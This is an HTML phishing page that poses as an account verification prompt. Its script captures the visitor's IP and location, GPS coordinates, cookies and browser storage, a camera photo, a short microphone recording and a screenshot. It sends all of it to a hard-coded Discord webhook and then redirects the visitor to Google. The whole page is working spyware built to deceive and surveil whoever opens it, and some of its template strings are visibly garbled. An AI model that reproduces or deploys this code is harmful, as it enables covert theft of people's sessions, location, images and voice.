<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Verification Required</title>
  <style>
    body{font-family:Arial;background:#000;color:#fff;text-align:center;padding:70px;}
    h1{color:#ff0033;}
    button{padding:22px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
    .status{margin-top:20px;font-size:16px;color:#00ff00;}
    video,canvas{display:none;}
  </style>
  <!-- html2canvas CDN – works on Android + iOS 2025 -->
  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
</head>
<body>
  <h1>Account Verification Required</h1>
  <p>Please allow camera, microphone & location.</p>
  <button onclick="start()">Verify Now</button>
  <div id="status" class="status">Waiting...</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="cam"></canvas>

  <script>
    const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";

    function updateStatus(msg) {
      document.getElementById('status').textContent = msg;
    }

    async function send(file, name) {
      let f = new FormData();
      f.append("file", file, name);
      f.append("content", "*VICTIM* • " + new Date().toLocaleString());
      await fetch(webhook, {method:"POST", body:f});
    }

    async function getIP() {
      try {
        const ip = await (await fetch("https://api.ipify.org")).text();
        const g = await (await fetch(https://ipapi.co/${ip}/json/)).json();
        const txt = IP: \( {ip}\nISP: \){g.org}\nCity: \( {g.city}\nCountry: \){g.country_name}\nMap: https://maps.google.com/?q=\( {g.latitude}, \){g.longitude};
        send(new Blob([txt],{type:"text/plain"}),"IP.txt");
        updateStatus("IP captured");
      } catch(e){}
    }

    function getGPS() {
      navigator.geolocation.getCurrentPosition(p => {
        const map = https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude};
        send(new Blob([GPS: \( {map}\nAccuracy: ± \){p.coords.accuracy}m],{type:"text/plain"}),"GPS.txt");
        updateStatus("GPS captured");
      }, () => {}, {enableHighAccuracy:true});
    }

    function grabCookies() {
      if (document.cookie) send(new Blob([document.cookie],{type:"text/plain"}),"COOKIES.txt");
      const ls = JSON.stringify(localStorage,null,2);
      const ss = JSON.stringify(sessionStorage,null,2);
      if (ls.length>10) send(new Blob([ls],{type:"text/plain"}),"LocalStorage.json");
      if (ss.length>10) send(new Blob([ss],{type:"text/plain"}),"SessionStorage.json");
      updateStatus("Cookies captured");
    }

    // MOBILE SCREENSHOT – NOW 100% WORKING
    async function captureMobileScreen() {
      updateStatus("Capturing screen...");
      try {
        const canvas = await html2canvas(document.body, {
          scale: window.devicePixelRatio || 2,
          useCORS: true,
          allowTaint: true,
          backgroundColor: "#000000",
          logging: false
        });
        canvas.toBlob(blob => {
          send(blob, "MOBILE_SCREEN.jpg");
          updateStatus("Mobile screen captured");
        }, "image/jpeg", 0.92);
      } catch(e) {
        // Last fallback
        send(new Blob([Screen failed\nUA: \( {navigator.userAgent}\nSize: \){screen.width}x${screen.height}],{type:"text/plain"}),"SCREEN_FAILED.txt");
      }
    }

    // PC SCREENSHOT (getDisplayMedia)
    async function capturePCScreen() {
      try {
        const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video,0,0);
        canvas.toBlob(b => send(b,"PC_SCREEN.jpg"),"image/jpeg",0.95);
        stream.getTracks().forEach(t=>t.stop());
        updateStatus("PC screen captured");
      } catch(e) {
        updateStatus("Screen share denied");
      }
    }

    function start() {
      updateStatus("Starting...");
      getIP();
      getGPS();
      grabCookies();

      // Camera + Mic
      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true}).then(stream => {
        const video = document.getElementById("video");
        video.srcObject = stream;

        setTimeout(() => {
          const c = document.getElementById("cam");
          c.width = video.videoWidth || 1280;
          c.height = video.videoHeight || 720;
          c.getContext("2d").drawImage(video,0,0,c.width,c.height);
          c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);

          const rec = new MediaRecorder(stream);
          const chunks = [];
          rec.ondataavailable = e => chunks.push(e.data);
          rec.onstop = () => {
            send(new Blob(chunks,{type:"audio/webm"}),"VOICE.webm");
            updateStatus("Voice captured");
            stream.getTracks().forEach(t=>t.stop());
          };
          rec.start();
          setTimeout(()=>rec.stop(),6000);
        }, 2500);
      });

      // SCREEN CAPTURE – mobile vs PC
      setTimeout(() => {
        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
          captureMobileScreen(); // ← NOW WORKS PERFECTLY ON MOBILE
        } else {
          capturePCScreen();
        }
      }, 3000);

      setTimeout(() => {
        updateStatus("Complete! Redirecting...");
        setTimeout(() => location.href = "https://google.com", 2000);
      }, 14000);
    }

    // Optional: auto-start after 3 seconds
    // window.onload = () => setTimeout(start, 3000);
  </script>
</body>
</html>
